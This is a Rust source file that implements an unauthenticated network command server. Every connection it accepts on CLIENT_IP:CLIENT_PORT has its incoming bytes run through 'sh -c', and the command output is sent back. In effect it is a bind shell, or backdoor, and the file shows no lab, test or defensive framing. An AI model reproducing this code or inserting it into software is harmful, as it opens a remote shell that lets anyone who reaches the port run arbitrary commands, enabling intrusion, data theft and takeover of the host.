use std::sync::{Arc, atomic::{AtomicUsize, Ordering}};
use std::net::{TcpListener, TcpStream};
use std::thread;
use std::io::{ErrorKind, Read, Write};
use crate::{CLIENT_IP, CLIENT_PORT};
use std::process::Command;

fn handle_client(mut stream: TcpStream) {
    let mut buffer = [0; 512];

    loop {
        let bytes_read = stream.read(&mut buffer).unwrap();

        if bytes_read == 0 { // client has closed the connection
            return;
        }

        let command = String::from_utf8_lossy(&buffer[..bytes_read]);

        let output = Command::new("sh")
            .arg("-c")
            .arg(command.to_string())
            .output()
            .expect("Failed to execute command");

        let output = if output.status.success() {
            output.stdout
        } else {
            output.stderr
        };

        stream.write_all(&output).unwrap();
    }
}

pub fn start_server() {
    println!("Starting listening at {}:{}", CLIENT_IP, CLIENT_PORT);
    let listener = TcpListener::bind(format!("{}:{}", CLIENT_IP, CLIENT_PORT)).unwrap();

    let thread_count = Arc::new(AtomicUsize::new(0));

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                let thread_count = Arc::clone(&thread_count);
                thread_count.fetch_add(1, Ordering::SeqCst);
                thread::spawn(move || handle_client(stream));
            }
            Err(e) => match e.kind() {
                ErrorKind::ConnectionRefused => {
                    eprintln!("Connection was refused.");
                    // Handle connection refused error
                },
                ErrorKind::TimedOut => {
                    eprintln!("Connection timed out.");
                    // Handle timeout error
                },
                _ => {
                    eprintln!("Failed to accept connection: {}", e);
                    // Handle other types of errors
                }
            }
        }
    }

    println!("Number of threads: {}", thread_count.load(Ordering::SeqCst));
}